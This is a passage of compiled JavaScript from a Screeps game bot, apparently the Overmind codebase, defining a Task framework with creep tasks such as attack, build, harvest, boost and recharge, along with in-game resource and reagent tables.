        }
        return out;
    }
    resolveStack(stack) {
        if (!Log_1.sourceMap) {
            return stack;
        }
        return _.map(stack.split('\n').map(resolve), 'final').join('\n');
    }
    adjustFileLine(visibleText, line) {
        const newPad = Math.max(visibleText.length, this._maxFileString);
        this._maxFileString = Math.min(newPad, LOG_MAX_PAD);
        return `|${_.padRight(line, line.length + this._maxFileString - visibleText.length, ' ')}|`;
    }
};
Log = Log_1 = __decorate([
    profile
], Log);
if (LOG_LOAD_SOURCE_MAP) {
    Log.loadSourceMap();
}
const log = new Log();

/**
 * Creep tasks setup instructions
 *
 * Javascript:
 * 1. In main.js:   require("tasks/prototypes.js");
 * 2. As needed:    var Tasks = require("<path to Tasks.js>");
 *
 * Typescript:
 * 1. In main.ts:   import "./tasks/prototypes";
 * 2. As needed:    import {Tasks} from "<path to Tasks.ts>"
 *
 * If you use Travler, change all occurrences of creep.moveTo() to creep.goTo()
 */
/**
 * An abstract class for encapsulating creep actions. This generalizes the concept of "do action X to thing Y until
 * condition Z is met" and saves a lot of convoluted and duplicated code in creep logic. A Task object contains
 * the necessary logic for traveling to a target, performing a task, and realizing when a task is no longer sensible
 * to continue.
 */
let Task = class Task {
    constructor(taskName, target, options = {}) {
        // Parameters for the task
        this.name = taskName;
        this._creep = {
            name: '',
        };
        if (target) { // Handles edge cases like when you're done building something and target disappears
            this._target = {
                ref: target.ref,
                _pos: target.pos,
            };
        }
        else {
            this._target = {
                ref: '',
                _pos: {
                    x: -1,
                    y: -1,
                    roomName: '',
                }
            };
        }
        this._parent = null;
        this.settings = {
            targetRange: 1,
            workOffRoad: false,
            oneShot: false,
            timeout: Infinity,
            blind: true,
        };
        this.tick = Game.time;
        this.options = options;
        this.data = {};
    }
    /**
     * Get a serialized ProtoTask from the current task
     */
    get proto() {
        return {
            name: this.name,
            _creep: this._creep,
            _target: this._target,
            _parent: this._parent,
            tick: this.tick,
            options: this.options,
            data: this.data,
        };
    }
    /**
     * Set the current task from a serialized ProtoTask
     */
    set proto(protoTask) {
        // Don't write to this.name; used in task switcher
        this._creep = protoTask._creep;
        this._target = protoTask._target;
        this._parent = protoTask._parent;
        this.tick = protoTask.tick;
        this.options = protoTask.options;
        this.data = protoTask.data;
    }
    /**
     * Return the wrapped creep which is executing this task
     */
    get creep() {
        // Returns zerg wrapper instead of creep to use monkey-patched functions
        return Overmind.zerg[this._creep.name];
    }
    /**
     * Set the creep which is executing this task
     */
    set creep(creep) {
        this._creep.name = creep.name;
        if (this._parent) {
            this.parent.creep = creep;
        }
    }
    /**
     * Dereferences the Task's target
     */
    get target() {
        return deref(this._target.ref);
    }
    /**
     * Dereferences the saved target position; useful for situations where you might lose vision
     */
    get targetPos() {
        // refresh if you have visibility of the target
        if (!this._targetPos) {
            if (this.target) {
                this._target._pos = this.target.pos;
            }
            this._targetPos = derefRoomPosition(this._target._pos);
        }
        return this._targetPos;
    }
    /**
     * Get the Task's parent
     */
    get parent() {
        return (this._parent ? initializeTask(this._parent) : null);
    }
    /**
     * Set the Task's parent
     */
    set parent(parentTask) {
        this._parent = parentTask ? parentTask.proto : null;
        // If the task is already assigned to a creep, update their memory
        if (this.creep) {
            this.creep.task = this;
        }
    }
    /**
     * Return a list of [this, this.parent, this.parent.parent, ...] as tasks
     */
    get manifest() {
        const manifest = [this];
        let parent = this.parent;
        while (parent) {
            manifest.push(parent);
            parent = parent.parent;
        }
        return manifest;
    }
    /**
     * Return a list of [this.target, this.parent.target, ...] without fully instantiating the list of tasks
     */
    get targetManifest() {
        const targetRefs = [this._target.ref];
        let parent = this._parent;
        while (parent) {
            targetRefs.push(parent._target.ref);
            parent = parent._parent;
        }
        return _.map(targetRefs, ref => deref(ref));
    }
    /**
     * Return a list of [this.targetPos, this.parent.targetPos, ...] without fully instantiating the list of tasks
     */
    get targetPosManifest() {
        const targetPositions = [this._target._pos];
        let parent = this._parent;
        while (parent) {
            targetPositions.push(parent._target._pos);
            parent = parent._parent;
        }
        return _.map(targetPositions, protoPos => derefRoomPosition(protoPos));
    }
    /**
     * Fork the task, assigning a new task to the creep with this task as its parent
     */
    fork(newTask) {
        newTask.parent = this;
        if (this.creep) {
            this.creep.task = newTask;
        }
        return newTask;
    }
    /**
     * Test if the task is valid; if it is not, automatically remove task and transition to parent
     */
    isValid() {
        let validTask = false;
        if (this.creep) {
            validTask = this.isValidTask() && Game.time - this.tick < this.settings.timeout;
        }
        let validTarget = false;
        if (this.target) {
            validTarget = this.isValidTarget();
        }
        else if ((this.settings.blind || this.options.blind) && !Game.rooms[this.targetPos.roomName]) {
            // If you can't see the target's room but you have blind enabled, then that's okay
            validTarget = true;
        }
        // Return if the task is valid; if not, finalize/delete the task and return false
        if (validTask && validTarget) {
            return true;
        }
        else {
            // Switch to parent task if there is one
            this.finish();
            const isValid = this.parent ? this.parent.isValid() : false;
            return isValid;
        }
    }
    /**
     * Move to within range of the target
     */
    moveToTarget(range = this.settings.targetRange) {
        return this.creep.goTo(this.targetPos, { range: range });
    }
    /**
     * Moves to the next position on the agenda if specified - call this in some tasks after work() is completed
     */
    moveToNextPos() {
        if (this.options.nextPos) {
            const nextPos = derefRoomPosition(this.options.nextPos);
            return this.creep.goTo(nextPos);
        }
    }
    /**
     * Return expected number of ticks until creep arrives at its first destination
     */
    get eta() {
        if (this.creep && this.creep.memory._go && this.creep.memory._go.path) {
            return this.creep.memory._go.path.length;
        }
    }
    /**
     * Execute this task each tick. Returns nothing unless work is done.
     */
    run() {
        if (this.isWorking) {
            delete this.creep.memory._go;
            // if (this.settings.workOffRoad) { // this is disabled as movement priorities makes it unnecessary
            //  // Move to somewhere nearby that isn't on a road
            //  this.creep.park(this.targetPos, true);
            // }
            const result = this.work();
            if (this.settings.oneShot && result === OK) {
                this.finish();
            }
            return result;
        }
        else {
            this.moveToTarget();
        }
    }
    /**
     * Return whether the creep is currently performing its task action near the target
     */
    get isWorking() {
        return this.creep.pos.inRangeToPos(this.targetPos, this.settings.targetRange) && !this.creep.pos.isEdge;
    }
    /**
     * Finalize the task and switch to parent task (or null if there is none)
     */
    finish() {
        this.moveToNextPos();
        if (this.creep) {
            this.creep.task = this.parent;
        }
        else {
            log.debug(`No creep executing ${this.name}! Proto: ${JSON.stringify(this.proto)}`);
        }
    }
};
Task = __decorate([
    profile
], Task);

const attackTaskName = 'attack';
let TaskAttack = class TaskAttack extends Task {
    constructor(target, options = {}) {
        super(attackTaskName, target, options);
        // Settings
        this.settings.targetRange = 3;
    }
    isValidTask() {
        return (this.creep.getActiveBodyparts(ATTACK) > 0 || this.creep.getActiveBodyparts(RANGED_ATTACK) > 0);
    }
    isValidTarget() {
        return this.target && this.target.hits > 0;
    }
    work() {
        const creep = this.creep;
        const target = this.target;
        let attackReturn = 0;
        let rangedAttackReturn = 0;
        if (creep.getActiveBodyparts(ATTACK) > 0) {
            if (creep.pos.isNearTo(target)) {
                attackReturn = creep.attack(target);
            }
            else {
                attackReturn = this.moveToTarget(1); // approach target if you also have attack parts
            }
        }
        if (creep.pos.inRangeTo(target, 3) && creep.getActiveBodyparts(RANGED_ATTACK) > 0) {
            rangedAttackReturn = creep.rangedAttack(target);
        }
        if (attackReturn == OK && rangedAttackReturn == OK) {
            return OK;
        }
        else {
            if (attackReturn != OK) {
                return rangedAttackReturn;
            }
            else {
                return attackReturn;
            }
        }
    }
};
TaskAttack = __decorate([
    profile
], TaskAttack);

const buildTaskName = 'build';
let TaskBuild = class TaskBuild extends Task {
    constructor(target, options = {}) {
        super(buildTaskName, target, options);
        // Settings
        this.settings.targetRange = 3;
        this.settings.workOffRoad = true;
    }
    isValidTask() {
        return this.creep.carry.energy > 0;
    }
    isValidTarget() {
        return this.target && this.target.my && this.target.progress < this.target.progressTotal;
    }
    work() {
        // Fixes issue #9 - workers freeze if creep sitting on square
        if (!this.target.isWalkable) {
            const creepOnTarget = this.target.pos.lookFor(LOOK_CREEPS)[0];
            if (creepOnTarget) {
                const zerg = Overmind.zerg[creepOnTarget.name];
                if (zerg) {
                    this.creep.say('move pls');
                    zerg.moveOffCurrentPos();
                }
            }
        }
        return this.creep.build(this.target);
    }
};
TaskBuild = __decorate([
    profile
], TaskBuild);

const claimTaskName = 'claim';
let TaskClaim = class TaskClaim extends Task {
    constructor(target, options = {}) {
        super(claimTaskName, target, options);
        // Settings
    }
    isValidTask() {
        return (this.creep.getActiveBodyparts(CLAIM) > 0);
    }
    isValidTarget() {
        return (this.target != null && (!this.target.room || !this.target.owner));
    }
    work() {
        const result = this.creep.claimController(this.target);
        if (result == OK) {
            Overmind.shouldBuild = true; // rebuild the overmind object on the next tick to account for new room
        }
        return result;
    }
};
TaskClaim = __decorate([
    profile
], TaskClaim);

const dismantleTaskName = 'dismantle';
let TaskDismantle = class TaskDismantle extends Task {
    constructor(target, options = {}) {
        super(dismantleTaskName, target, options);
        this.settings.timeout = 100;
    }
    isValidTask() {
        return (this.creep.getActiveBodyparts(WORK) > 0);
    }
    isValidTarget() {
        return this.target && this.target.hits > 0;
    }
    work() {
        return this.creep.dismantle(this.target);
    }
};
TaskDismantle = __decorate([
    profile
], TaskDismantle);

var TaskDrop_1;
const dropTaskName = 'drop';
let TaskDrop = TaskDrop_1 = class TaskDrop extends Task {
    constructor(target, resourceType = RESOURCE_ENERGY, amount, options = {}) {
        if (target instanceof RoomPosition) {
            super(TaskDrop_1.taskName, { ref: '', pos: target }, options);
        }
        else {
            super(TaskDrop_1.taskName, { ref: '', pos: target.pos }, options);
        }
        // Settings
        this.settings.targetRange = 0;
        this.settings.oneShot = true;
        // Data
        this.data.resourceType = resourceType;
        this.data.amount = amount;
    }
    isValidTask() {
        const amount = this.data.amount || 1;
        const resourcesInCarry = this.creep.carry[this.data.resourceType] || 0;
        return resourcesInCarry >= amount;
    }
    isValidTarget() {
        return true;
    }
    isValid() {
        // It's necessary to override task.isValid() for tasks which do not have a RoomObject target
        let validTask = false;
        if (this.creep) {
            validTask = this.isValidTask();
        }
        // Return if the task is valid; if not, finalize/delete the task and return false
        if (validTask) {
            return true;
        }
        else {
            // Switch to parent task if there is one
            let isValid = false;
            if (this.parent) {
                isValid = this.parent.isValid();
            }
            this.finish();
            return isValid;
        }
    }
    work() {
        return this.creep.drop(this.data.resourceType, this.data.amount);
    }
};
TaskDrop.taskName = 'drop';
TaskDrop = TaskDrop_1 = __decorate([
    profile
], TaskDrop);

const fortifyTaskName = 'fortify';
let TaskFortify = class TaskFortify extends Task {
    constructor(target, options = {}) {
        super(fortifyTaskName, target, options);
        // Settings
        this.settings.timeout = 100; // Don't want workers to fortify indefinitely
        this.settings.targetRange = 3;
        this.settings.workOffRoad = true;
    }
    isValidTask() {
        return (this.creep.carry.energy > 0); // Times out once creep is out of energy
    }
    isValidTarget() {
        return this.target && this.target.hits < this.target.hitsMax;
    }
    work() {
        return this.creep.repair(this.target);
    }
};
TaskFortify = __decorate([
    profile
], TaskFortify);

const RESOURCE_IMPORTANCE = [
    RESOURCE_CATALYZED_GHODIUM_ALKALIDE,
    RESOURCE_CATALYZED_GHODIUM_ACID,
    RESOURCE_CATALYZED_ZYNTHIUM_ALKALIDE,
    RESOURCE_CATALYZED_ZYNTHIUM_ACID,
    RESOURCE_CATALYZED_LEMERGIUM_ALKALIDE,
    RESOURCE_CATALYZED_LEMERGIUM_ACID,
    RESOURCE_CATALYZED_KEANIUM_ALKALIDE,
    RESOURCE_CATALYZED_KEANIUM_ACID,
    RESOURCE_CATALYZED_UTRIUM_ALKALIDE,
    RESOURCE_CATALYZED_UTRIUM_ACID,
    RESOURCE_POWER,
    RESOURCE_GHODIUM_ALKALIDE,
    RESOURCE_GHODIUM_ACID,
    RESOURCE_ZYNTHIUM_ALKALIDE,
    RESOURCE_ZYNTHIUM_ACID,
    RESOURCE_LEMERGIUM_ALKALIDE,
    RESOURCE_LEMERGIUM_ACID,
    RESOURCE_KEANIUM_ALKALIDE,
    RESOURCE_KEANIUM_ACID,
    RESOURCE_UTRIUM_ALKALIDE,
    RESOURCE_UTRIUM_ACID,
    RESOURCE_GHODIUM_OXIDE,
    RESOURCE_GHODIUM_HYDRIDE,
    RESOURCE_ZYNTHIUM_OXIDE,
    RESOURCE_ZYNTHIUM_HYDRIDE,
    RESOURCE_LEMERGIUM_OXIDE,
    RESOURCE_LEMERGIUM_HYDRIDE,
    RESOURCE_KEANIUM_OXIDE,
    RESOURCE_KEANIUM_HYDRIDE,
    RESOURCE_UTRIUM_OXIDE,
    RESOURCE_UTRIUM_HYDRIDE,
    RESOURCE_UTRIUM_LEMERGITE,
    RESOURCE_ZYNTHIUM_KEANITE,
    RESOURCE_HYDROXIDE,
    RESOURCE_GHODIUM,
    RESOURCE_CATALYST,
    RESOURCE_ZYNTHIUM,
    RESOURCE_LEMERGIUM,
    RESOURCE_KEANIUM,
    RESOURCE_UTRIUM,
    RESOURCE_OXYGEN,
    RESOURCE_HYDROGEN,
    RESOURCE_ENERGY,
];
const REAGENTS = {
    // Tier 3
    [RESOURCE_CATALYZED_GHODIUM_ALKALIDE]: [RESOURCE_GHODIUM_ALKALIDE, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_GHODIUM_ACID]: [RESOURCE_GHODIUM_ACID, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_ZYNTHIUM_ACID]: [RESOURCE_ZYNTHIUM_ACID, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_ZYNTHIUM_ALKALIDE]: [RESOURCE_ZYNTHIUM_ALKALIDE, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_LEMERGIUM_ALKALIDE]: [RESOURCE_LEMERGIUM_ALKALIDE, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_LEMERGIUM_ACID]: [RESOURCE_LEMERGIUM_ACID, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_KEANIUM_ALKALIDE]: [RESOURCE_KEANIUM_ALKALIDE, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_KEANIUM_ACID]: [RESOURCE_KEANIUM_ACID, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_UTRIUM_ACID]: [RESOURCE_UTRIUM_ACID, RESOURCE_CATALYST],
    [RESOURCE_CATALYZED_UTRIUM_ALKALIDE]: [RESOURCE_UTRIUM_ALKALIDE, RESOURCE_CATALYST],
    // Tier 2
    [RESOURCE_GHODIUM_ACID]: [RESOURCE_GHODIUM_HYDRIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_GHODIUM_ALKALIDE]: [RESOURCE_GHODIUM_OXIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_ZYNTHIUM_ACID]: [RESOURCE_ZYNTHIUM_HYDRIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_ZYNTHIUM_ALKALIDE]: [RESOURCE_ZYNTHIUM_OXIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_LEMERGIUM_ALKALIDE]: [RESOURCE_LEMERGIUM_OXIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_LEMERGIUM_ACID]: [RESOURCE_LEMERGIUM_HYDRIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_KEANIUM_ALKALIDE]: [RESOURCE_KEANIUM_OXIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_KEANIUM_ACID]: [RESOURCE_KEANIUM_HYDRIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_UTRIUM_ACID]: [RESOURCE_UTRIUM_HYDRIDE, RESOURCE_HYDROXIDE],
    [RESOURCE_UTRIUM_ALKALIDE]: [RESOURCE_UTRIUM_OXIDE, RESOURCE_HYDROXIDE],
    // Tier 1
    [RESOURCE_GHODIUM_HYDRIDE]: [RESOURCE_GHODIUM, RESOURCE_HYDROGEN],
    [RESOURCE_GHODIUM_OXIDE]: [RESOURCE_GHODIUM, RESOURCE_OXYGEN],
    [RESOURCE_ZYNTHIUM_HYDRIDE]: [RESOURCE_ZYNTHIUM, RESOURCE_HYDROGEN],
    [RESOURCE_ZYNTHIUM_OXIDE]: [RESOURCE_ZYNTHIUM, RESOURCE_OXYGEN],
    [RESOURCE_LEMERGIUM_OXIDE]: [RESOURCE_LEMERGIUM, RESOURCE_OXYGEN],
    [RESOURCE_LEMERGIUM_HYDRIDE]: [RESOURCE_LEMERGIUM, RESOURCE_HYDROGEN],
    [RESOURCE_KEANIUM_OXIDE]: [RESOURCE_KEANIUM, RESOURCE_OXYGEN],
    [RESOURCE_KEANIUM_HYDRIDE]: [RESOURCE_KEANIUM, RESOURCE_HYDROGEN],
    [RESOURCE_UTRIUM_HYDRIDE]: [RESOURCE_UTRIUM, RESOURCE_HYDROGEN],
    [RESOURCE_UTRIUM_OXIDE]: [RESOURCE_UTRIUM, RESOURCE_OXYGEN],
    // Tier 0
    [RESOURCE_GHODIUM]: [RESOURCE_ZYNTHIUM_KEANITE, RESOURCE_UTRIUM_LEMERGITE],
    [RESOURCE_HYDROXIDE]: [RESOURCE_OXYGEN, RESOURCE_HYDROGEN],
    [RESOURCE_ZYNTHIUM_KEANITE]: [RESOURCE_ZYNTHIUM, RESOURCE_KEANIUM],
    [RESOURCE_UTRIUM_LEMERGITE]: [RESOURCE_UTRIUM, RESOURCE_LEMERGIUM]
};
const boostParts = {
    UH: ATTACK,
    UO: WORK,
    KH: CARRY,
    KO: RANGED_ATTACK,
    LH: WORK,
    LO: HEAL,
    ZH: WORK,
    ZO: MOVE,
    GH: WORK,
    GO: TOUGH,
    UH2O: ATTACK,
    UHO2: WORK,
    KH2O: CARRY,
    KHO2: RANGED_ATTACK,
    LH2O: WORK,
    LHO2: HEAL,
    ZH2O: WORK,
    ZHO2: MOVE,
    GH2O: WORK,
    GHO2: TOUGH,
    XUH2O: ATTACK,
    XUHO2: WORK,
    XKH2O: CARRY,
    XKHO2: RANGED_ATTACK,
    XLH2O: WORK,
    XLHO2: HEAL,
    XZH2O: WORK,
    XZHO2: MOVE,
    XGH2O: WORK,
    XGHO2: TOUGH,
};
const boostResources = {
    attack: {
        1: 'UH',
        2: 'UH2O',
        3: 'XUH2O',
    },
    carry: {
        1: 'KH',
        2: 'KH2O',
        3: 'XKH2O',
    },
    ranged_attack: {
        1: 'KO',
        2: 'KHO2',
        3: 'XKHO2',
    },
    heal: {
        1: 'LO',
        2: 'LHO2',
        3: 'XLHO2',
    },
    move: {
        1: 'ZO',
        2: 'ZHO2',
        3: 'XZHO2',
    },
    tough: {
        1: 'GO',
        2: 'GHO2',
        3: 'XGHO2',
    },
    harvest: {
        1: 'UO',
        2: 'UHO2',
        3: 'XUHO2',
    },
    construct: {
        1: 'LH',
        2: 'LH2O',
        3: 'XLH2O',
    },
    dismantle: {
        1: 'ZH',
        2: 'ZH2O',
        3: 'XZH2O',
    },
    upgrade: {
        1: 'GH',
        2: 'GH2O',
        3: 'XGH2O',
    },
};

const getBoostedTaskName = 'getBoosted';
const MIN_LIFETIME_FOR_BOOST = 0.85;
let TaskGetBoosted = class TaskGetBoosted extends Task {
    constructor(target, boostType, partCount, options = {}) {
        super(getBoostedTaskName, target, options);
        // Settings
        this.data.resourceType = boostType;
        this.data.amount = partCount;
    }
    isValidTask() {
        const lifetime = _.any(this.creep.body, part => part.type == CLAIM) ? CREEP_CLAIM_LIFE_TIME : CREEP_LIFE_TIME;
        if (this.creep.ticksToLive && this.creep.ticksToLive < MIN_LIFETIME_FOR_BOOST * lifetime) {
            return false; // timeout after this amount of lifespan has passed
        }
        const partCount = (this.data.amount || this.creep.getActiveBodyparts(boostParts[this.data.resourceType]));
        return (this.creep.boostCounts[this.data.resourceType] || 0) < partCount;
    }
    isValidTarget() {
        const partCount = (this.data.amount || this.creep.getActiveBodyparts(boostParts[this.data.resourceType]));
        return this.target && this.target.mineralType == this.data.resourceType &&
            this.target.mineralAmount >= LAB_BOOST_MINERAL * partCount &&
            this.target.energy >= LAB_BOOST_ENERGY * partCount;
    }
    work() {
        if (this.creep.spawning) {
            return ERR_INVALID_TARGET;
        }
        const partCount = (this.data.amount || this.creep.getActiveBodyparts(boostParts[this.data.resourceType]));
        if (this.target.mineralType == this.data.resourceType &&
            this.target.mineralAmount >= LAB_BOOST_MINERAL * partCount &&
            this.target.energy >= LAB_BOOST_ENERGY * partCount) {
            const result = this.target.boostCreep(deref(this._creep.name), this.data.amount);
            log.info(`Lab@${this.target.pos.print}: boosting creep ${this.creep.print} with ${this.target.mineralType}!`
                + ` Response: ${result}`);
            return result;
        }
        else {
            return ERR_NOT_FOUND;
        }
    }
};
TaskGetBoosted = __decorate([
    profile
], TaskGetBoosted);

const getRenewedTaskName = 'getRenewed';
let TaskGetRenewed = class TaskGetRenewed extends Task {
    constructor(target, options = {}) {
        super(getRenewedTaskName, target, options);
    }
    isValidTask() {
        const hasClaimPart = _.filter(this.creep.body, (part) => part.type == CLAIM).length > 0;
        const lifetime = hasClaimPart ? CREEP_CLAIM_LIFE_TIME : CREEP_LIFE_TIME;
        return this.creep.ticksToLive != undefined && this.creep.ticksToLive < 0.9 * lifetime;
    }
    isValidTarget() {
        return this.target.my && !this.target.spawning;
    }
    work() {
        return this.target.renewCreep(this.creep.creep);
    }
};
TaskGetRenewed = __decorate([
    profile
], TaskGetRenewed);

// Type guards library: this allows for instanceof - like behavior for much lower CPU cost. Each type guard
// differentiates an ambiguous input by recognizing one or more unique properties.
function isEnergyStructure(obj) {
    return obj.energy != undefined && obj.energyCapacity != undefined;
}
function isStoreStructure(obj) {
    return obj.store != undefined && obj.storeCapacity != undefined;
}
function isStructure(obj) {
    return obj.structureType != undefined;
}
function isOwnedStructure(structure) {
    return structure.owner != undefined;
}
function isSource(obj) {
    return obj.energy != undefined;
}
function isTombstone(obj) {
    return obj.deathTime != undefined;
}
function isResource(obj) {
    return obj.amount != undefined;
}
function hasPos(obj) {
    return obj.pos != undefined;
}
function isCreep(obj) {
    return obj.fatigue != undefined;
}
function isPowerCreep(obj) {
    return obj.powers != undefined;
}
function isZerg(creep) {
    return creep.creep != undefined;
}
function isCombatZerg(zerg) {
    return zerg.isCombatZerg != undefined;
}

const goToTaskName = 'goTo';
let TaskGoTo = class TaskGoTo extends Task {
    constructor(target, options = {}) {
        if (hasPos(target)) {
            super(goToTaskName, { ref: '', pos: target.pos }, options);
        }
        else {
            super(goToTaskName, { ref: '', pos: target }, options);
        }
        // Settings
        this.settings.targetRange = 1;
    }
    isValidTask() {
        return !this.creep.pos.inRangeTo(this.targetPos, this.settings.targetRange);
    }
    isValidTarget() {
        return true;
    }
    isValid() {
        let validTask = false;
        if (this.creep) {
            validTask = this.isValidTask();
        }
        // Return if the task is valid; if not, finalize/delete the task and return false
        if (validTask) {
            return true;
        }
        else {
            // Switch to parent task if there is one
            let isValid = false;
            if (this.parent) {
                isValid = this.parent.isValid();
            }
            this.finish();
            return isValid;
        }
    }
    work() {
        return OK;
    }
};
TaskGoTo = __decorate([
    profile
], TaskGoTo);

const goToRoomTaskName = 'goToRoom';
let TaskGoToRoom = class TaskGoToRoom extends Task {
    constructor(roomName, options = {}) {
        super(goToRoomTaskName, { ref: '', pos: new RoomPosition(25, 25, roomName) }, options);
        // Settings
        this.settings.targetRange = 23; // Target is almost always controller flag, so range of 2 is acceptable
    }
    isValidTask() {
        return !this.creep.pos.inRangeTo(this.targetPos, this.settings.targetRange);
    }
    isValidTarget() {
        return true;
    }
    isValid() {
        let validTask = false;
        if (this.creep) {
            validTask = this.isValidTask();
        }
        // Return if the task is valid; if not, finalize/delete the task and return false
        if (validTask) {
            return true;
        }
        else {
            // Switch to parent task if there is one
            let isValid = false;
            if (this.parent) {
                isValid = this.parent.isValid();
            }
            this.finish();
            return isValid;
        }
    }
    work() {
        return OK;
    }
};
TaskGoToRoom = __decorate([
    profile
], TaskGoToRoom);

const harvestTaskName = 'harvest';
let TaskHarvest = class TaskHarvest extends Task {
    constructor(target, options = {}) {
        super(harvestTaskName, target, options);
    }
    isValidTask() {
        return _.sum(this.creep.carry) < this.creep.carryCapacity;
    }
    isValidTarget() {
        if (isSource(this.target)) {
            return this.target.energy > 0;
        }
        else {
            return this.target.mineralAmount > 0;
        }
    }
    work() {
        return this.creep.harvest(this.target);
    }
};
TaskHarvest = __decorate([
    profile
], TaskHarvest);

const healTaskName = 'heal';
let TaskHeal = class TaskHeal extends Task {
    constructor(target, options = {}) {
        super(healTaskName, target, options);
        // Settings
        this.settings.targetRange = 3;
    }
    isValidTask() {
        return (this.creep.getActiveBodyparts(HEAL) > 0);
    }
    isValidTarget() {
        return this.target && this.target.hits < this.target.hitsMax && this.target.my;
    }
    work() {
        if (this.creep.pos.isNearTo(this.target)) {
            return this.creep.heal(this.target);
        }
        else {
            this.moveToTarget(1);
        }
        return this.creep.rangedHeal(this.target);
    }
};
TaskHeal = __decorate([
    profile
], TaskHeal);

// Invalid task assigned if instantiation fails.
const invalidTarget = {
    ref: '',
    pos: {
        x: 25,
        y: 25,
        roomName: 'W6N1',
    }
};
let TaskInvalid = class TaskInvalid extends Task {
    constructor() {
        super('INVALID', invalidTarget);
    }
    isValidTask() {
        return false;
    }
    isValidTarget() {
        return false;
    }
    work() {
        return OK;
    }
};
TaskInvalid = __decorate([
    profile
], TaskInvalid);

const meleeAttackTaskName = 'meleeAttack';
let TaskMeleeAttack = class TaskMeleeAttack extends Task {
    constructor(target, options = {}) {
        super(meleeAttackTaskName, target, options);
        // Settings
        this.settings.targetRange = 1;
    }
    isValidTask() {
        return this.creep.getActiveBodyparts(ATTACK) > 0;
    }
    isValidTarget() {
        const target = this.target;
        return target && target.hits > 0; // && target.my == false);
    }
    work() {
        return this.creep.attack(this.target);
    }
};
TaskMeleeAttack = __decorate([
    profile
], TaskMeleeAttack);

const pickupTaskName = 'pickup';
let TaskPickup = class TaskPickup extends Task {
    constructor(target, options = {}) {
        super('pickup', target, options);
        this.settings.oneShot = true;
    }
    isValidTask() {
        return _.sum(this.creep.carry) < this.creep.carryCapacity;
    }
    isValidTarget() {
        return this.target && this.target.amount > 0;
    }
    work() {
        return this.creep.pickup(this.target);
    }
};
TaskPickup = __decorate([
    profile
], TaskPickup);

const rangedAttackTaskName = 'rangedAttack';
let TaskRangedAttack = class TaskRangedAttack extends Task {
    constructor(target, options = {}) {
        super(rangedAttackTaskName, target, options);
        // Settings
        this.settings.targetRange = 3;
    }
    isValidTask() {
        return this.creep.getActiveBodyparts(RANGED_ATTACK) > 0;
    }
    isValidTarget() {
        return this.target && this.target.hits > 0;
    }
    work() {
        return this.creep.rangedAttack(this.target);
    }
};
TaskRangedAttack = __decorate([
    profile
], TaskRangedAttack);

/* Withdraw a resource from a target */
const withdrawTaskName = 'withdraw';
let TaskWithdraw = class TaskWithdraw extends Task {
    constructor(target, resourceType = RESOURCE_ENERGY, amount, options = {}) {
        super(withdrawTaskName, target, options);
        // Settings
        this.settings.oneShot = true;
        this.data.resourceType = resourceType;
        this.data.amount = amount;
    }
    isValidTask() {
        const amount = this.data.amount || 1;
        return (_.sum(this.creep.carry) <= this.creep.carryCapacity - amount);
    }
    isValidTarget() {
        const amount = this.data.amount || 1;
        const target = this.target;
        if (target instanceof Tombstone || isStoreStructure(target)) {
            return (target.store[this.data.resourceType] || 0) >= amount;
        }
        else if (isEnergyStructure(target) && this.data.resourceType == RESOURCE_ENERGY) {
            return target.energy >= amount;
        }
        else {
            if (target instanceof StructureLab) {
                return this.data.resourceType == target.mineralType && target.mineralAmount >= amount;
            }
            else if (target instanceof StructurePowerSpawn) {
                return this.data.resourceType == RESOURCE_POWER && target.power >= amount;
            }
        }
        return false;
    }
    work() {
        return this.creep.withdraw(this.target, this.data.resourceType, this.data.amount);
    }
};
TaskWithdraw = __decorate([
    profile
], TaskWithdraw);

const rechargeTaskName = 'recharge';
// This is a "dispenser task" which is not itself a valid task, but dispenses a task when assigned to a creep.
let TaskRecharge = class TaskRecharge extends Task {
    constructor(target, minEnergy = 0, options = {}) {
        super(rechargeTaskName, { ref: '', pos: { x: -1, y: -1, roomName: '' } }, options);
        this.data.minEnergy = minEnergy;
    }
    rechargeRateForCreep(creep, obj) {
        if (creep.colony.hatchery && creep.colony.hatchery.battery
            && obj.id == creep.colony.hatchery.battery.id && creep.roleName != 'queen') {
            return false; // only queens can use the hatchery battery
        }
        let amount = isResource(obj) ? obj.amount : obj.energy;
        if (amount < this.data.minEnergy) {
            return false;
        }
        const otherTargeters = _.filter(_.map(obj.targetedBy, name => Overmind.zerg[name]), zerg => !!zerg && zerg.memory._task
            && (zerg.memory._task.name == withdrawTaskName
                || zerg.memory._task.name == pickupTaskName));
        const resourceOutflux = _.sum(_.map(otherTargeters, other => other.carryCapacity - _.sum(other.carry)));
        amount = minMax(amount - resourceOutflux, 0, creep.carryCapacity);
        const effectiveAmount = amount / (creep.pos.getMultiRoomRangeTo(obj.pos) + 1);
        if (effectiveAmount <= 0) {
            return false;
        }
        else {
            return effectiveAmount;
        }
    }
    // Override creep setter to dispense a valid recharge task
    set creep(creep) {
        this._creep.name = creep.name;
        if (this._parent) {
            this.parent.creep = creep;
        }
        // Choose the target to maximize your energy gain subject to other targeting workers
        const target = creep.inColonyRoom ? maxBy(creep.colony.rechargeables, o => this.rechargeRateForCreep(creep, o))
            : maxBy(creep.room.rechargeables, o => this.rechargeRateForCreep(creep, o));
        if (!target || creep.pos.getMultiRoomRangeTo(target.pos) > 40) {
            // workers shouldn't harvest; let drones do it (disabling this check can destabilize early economy)
            const canHarvest = creep.getActiveBodyparts(WORK) > 0 && creep.roleName != 'worker';
            if (canHarvest) {
                // Harvest from a source if there is no recharge target available
                const availableSources = _.filter(creep.room.sources, function (source) {
                    // Only harvest from sources which aren't surrounded by creeps excluding yourself
                    const isSurrounded = source.pos.availableNeighbors(false).length == 0;
                    return !isSurrounded || creep.pos.isNearTo(source);
                });
